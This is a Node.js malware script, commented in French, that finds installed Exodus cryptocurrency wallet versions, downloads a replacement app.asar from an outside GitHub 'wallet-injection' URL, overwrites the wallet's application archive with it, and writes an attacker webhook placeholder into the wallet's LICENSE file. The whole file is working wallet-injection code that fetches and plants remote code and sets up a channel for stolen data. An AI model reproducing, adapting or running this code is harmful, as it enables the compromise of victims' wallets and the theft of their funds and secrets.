const fs = require("fs");
const path = require("path");
const axios = require("axios");

// Configuration
var config = {
    webhook: "%WEBHOOK%",
    ExodusInjectionURL: "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar" // Ajout de la variable manquante
};

// Fonction principale d'injection
async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
    
    if (!fs.existsSync(exodusPath)) {
        console.error("[ERROR] - Exodus n'est pas installé.");
        return;
    }

    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

    if (exodusDirs.length === 0) {
        console.error("[ERROR] - Aucune version d'Exodus trouvée.");
        return;
    }

    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');

        console.log(`[INFO] - Injection en cours dans : ${exodusAsarPath}`);
        await inject(exodusPathWithVersion, exodusAsarPath, config.ExodusInjectionURL, exodusLicensePath, config.webhook);
    }
}

// Fonction qui injecte le fichier malveillant
async function inject(appPath, asarPath, injectionUrl, licensePath, webhook) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
        console.error("[ERROR] - Fichier app.asar introuvable !");
        return;
    }

    try {
        console.log(`[INFO] - Téléchargement du fichier injecté depuis ${injectionUrl}`);
        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            console.error("[ERROR] - Impossible de télécharger le fichier.");
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        console.log("[INFO] - Fichier injecté avec succès !");
        
        // Écrit le webhook dans LICENSE
        if (licensePath) {
            fs.writeFileSync(licensePath, webhook);
            console.log("[INFO] - Webhook ajouté dans LICENSE.");
        }

    } catch (error) {
        console.error("[ERROR] - Erreur durant l'injection :", error);
    }
}

// Exécute l'injection
injectExodus();
